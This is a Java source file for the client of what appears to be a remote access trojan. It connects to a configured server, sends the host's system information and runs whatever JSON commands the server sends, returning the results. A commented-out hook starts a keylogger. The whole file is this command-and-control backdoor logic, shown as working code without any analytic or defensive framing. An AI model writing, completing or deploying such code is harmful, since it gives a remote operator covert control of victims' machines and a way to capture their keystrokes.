package client;

import controllers.Controller;
import controllers.Executable;
import utils.JSON;
import utils.console;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.SocketException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;

import static utils.Command.COMMAND;
import static utils.Command.COMMAND_CLIENT_SYSTEM_INFO;
import static utils.Environment.DEFAULT_SERVER_HOST;
import static utils.Environment.DEFAULT_SERVER_PORT;

public class Client {
    private static ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private Socket connection;
    private BufferedReader inputStream;
    private DataOutputStream outputStream;

    public Client() {
        Controller.init();
        /**
         * START KEYLOGGER
         * KeyLogger.start();
         */
    }

    public BufferedReader getInputStream() throws Exception {
        return inputStream == null ? inputStream = new BufferedReader(new InputStreamReader(this.connection.getInputStream())) : inputStream;
    }

    public DataOutputStream getOutputStream() throws Exception {
        return outputStream == null ? outputStream = new DataOutputStream(this.connection.getOutputStream()) : outputStream;
    }

    public void start() {
        try {
            connection = new Socket(DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT);
            console.info("CLIENT LOGGED IN");

            String input;

            this.getInputStream();
            this.getOutputStream();

            this.onSend(Controller.get(COMMAND_CLIENT_SYSTEM_INFO).execute(null));

            while ((input = this.inputStream.readLine()) != null) {
                this.onHandle(input);
            }

        } catch (Exception e) {
            if (e instanceof SocketException) return;
            e.printStackTrace();
        }
    }

    public void onHandle(String message) {
        JSON json;
        try {
            json = new JSON(message);
            Executable executor = Controller.get(json.get(COMMAND));
            this.onSend(executor.execute(json));
        } catch (Exception e) {
            if (e instanceof SocketException) return;
            e.printStackTrace();
        }
    }

    public void onSend(String message) {
        try {
            this.outputStream.writeBytes(message + "\n");
        } catch (Exception e) {
            if (e instanceof SocketException) return;
            e.printStackTrace();
        }
    }

    public static ScheduledExecutorService getScheduler() {
        return scheduler;
    }

    public static void main(String[] args) {
        Client c = new Client();
        c.start();
    }
}
